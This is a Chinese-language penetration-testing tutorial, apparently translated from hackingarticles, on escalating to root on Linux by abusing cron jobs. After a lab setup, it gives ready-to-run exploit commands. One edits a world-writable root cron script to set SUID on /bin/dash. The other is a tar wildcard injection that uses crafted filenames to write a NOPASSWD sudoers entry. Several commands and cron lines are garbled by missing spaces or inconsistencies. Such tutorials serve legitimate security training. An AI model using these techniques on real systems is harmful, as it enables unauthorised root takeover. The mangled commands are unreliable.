![1.png](https://image.3001.net/images/20180622/15295985552102.png!small)

## 写在前面的话

今天给各位渗透测试同行们提供一种Linux提权方法，在这篇文章中，我们将介绍如何使用Cron
Jobs来实现Linux下的权限提升，并获取远程主机的root访问权。

## Cron Jobs能做什么？

Cron
Jobs可以在服务器端完成一系列计划任务（设定时间自动执行命令等等），一般它主要用于执行系统管理员任务，例如数据备份或清理缓存目录等等。Cron这个词来源于“crontab”，而这个玩意儿存在于/etc目录中。

![2.png](https://image.3001.net/images/20180622/15295985664701.png!small)

比如说，在crontab中，我们添加下列条目来实现每隔一个小时就自动打印出apache的错误日志“

    
    
    1 0 ** * printf "" > /var/log/apache/error_log

## Crontab文件重写

### 设置简陋配置的Cron任务

目标：在crontab的帮助下，设置一个新的任务来运行目标Python脚本，并清除指定目录中的全部数据。

假设目录名称为“cleanup“，它的数据每隔两分钟就会被自动清空一次。在开始之前我们需要在/home/cleanup中存储一些数据：

    
    
    mkdir cleanup
    cd cleanup
    echo "hello freinds" > 1.txt
    echo "ALL files will be deleted in 2 mints" > 2.txt
    echo "" > 1.php
    echo "" > 2.php
    ls  
    

![3.png](https://image.3001.net/images/20180622/15295986019065.png!small)

接下来，编写一个Python脚本来删除/home/cleanup目录中的数据，我们需要给这个脚本完整的r/w/x权限。

切换目录并创建脚本：

    
    
    cd /tmp
    nano cleanup.py  
    

脚本代码：

    
    
    #!/usr/bin/envpython
    import os
    import sys
    try:
    os.system('rm -r /home/cleanup/* ')
    except:
    sys.exit()  
    

赋予权限：

    
    
    chmod 777 cleanup.py

![4.png](https://image.3001.net/images/20180622/15295986418740.png!small)

最后配合crontab设置计划任务，并每隔两分钟运行一次cleanup.py :

    
    
    nano /etc/crontab
    */2*   * * *   root    /tmp /cleanup.py  
    

![5.png](https://image.3001.net/images/20180622/15295986676284.png!small)

验证结果：

    
    
    cd /home/cleanup
    ls
    date
    ls  
    

![6.png](https://image.3001.net/images/20180622/15295986885894.png!small)

大家可以看到数据每隔两分钟就会被清空一次。

### 后渗透利用

开启你的攻击设备，然后入侵目标系统，接下来直接进到提权步骤。假设我们已经通过ssh成功登录了目标设备，并访问了非root用户终端，然后执行以下命令：

    
    
    cat /etc/crontab
    ls -al /tmp/cleanup.py
    cat /tmp/cleanup.py  
    

我们此时可以发现，crontab每隔两分钟便会运行一次Python脚本，我们待会儿需要利用这一点。

![7.png](https://image.3001.net/images/20180622/15295987194521.png!small)

启用/bin/dash的SUID，使用nano打开cleanup.py ，并将其中的“rm -r /tmp/*”替换成下列内容：

    
    
    os.system('chmod u+s /bin/dash')

![8.png](https://image.3001.net/images/20180622/15295987399982.png!small)

两分钟之后，它将会给/bin/dash设置SUID权限，运行之后你就能拿到root权限了：

    
    
    /bin/dash
    id
    whoami  
    

![9.png](https://image.3001.net/images/20180622/15295987802483.png!small)

## Crontab Tar通配符注入

### 环境搭建

目标：在crontab的帮助下设置一个计划任务，备份HTML目录中的tar文档。

注意，该目录需要具备可执行权限（x）。

![10.png](https://image.3001.net/images/20180622/15295988312954.png!small)

然后每隔一分钟将/html目录中的tar文件备份到/var/backups中：

    
    
    nano /etc/crontab
    */1*   * * *   root tar -zcf /var/backups/html.tgz/var/www/html/*  
    

![11.png](https://image.3001.net/images/20180622/15295988532258.png!small)

执行下列命令查看运行结果：

    
    
    cd /var/backup
    ls
    date  
    

从下图中我们可以看到，一分钟之后html.tgz文件已经生成了：

![12.png](https://image.3001.net/images/20180622/15295988764697.png!small)

### 后渗透利用

开启你的攻击设备，然后入侵目标系统，接下来直接进到提权步骤。假设我们已经通过ssh成功登录了目标设备，并访问了非root用户终端。接下来，打开crontab查看计划任务是否已经设置成功：

    
    
    cat /etc/crontab

![13.png](https://image.3001.net/images/20180622/15295989069087.png!small)

执行下列命令来授权sudo权限，并登录用户账号，即实现通配符注入：

    
    
    echo'echo "ignite ALL=(root) NOPASSWD: ALL" > /etc/sudoers'>test.sh
    echo"" > "--checkpoint-action=exec=sh test.sh"
    echo"" > --checkpoint=1
    tarcf archive.tar *  
    

一分钟之后，它将会给用户ignite赋予sudo权限：

    
    
    sudo -l
    sudo bash
    whoami  
    

![14.png](https://image.3001.net/images/20180622/1529598939930.png!small)

 *** 参考来源：[hackingarticles](http://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

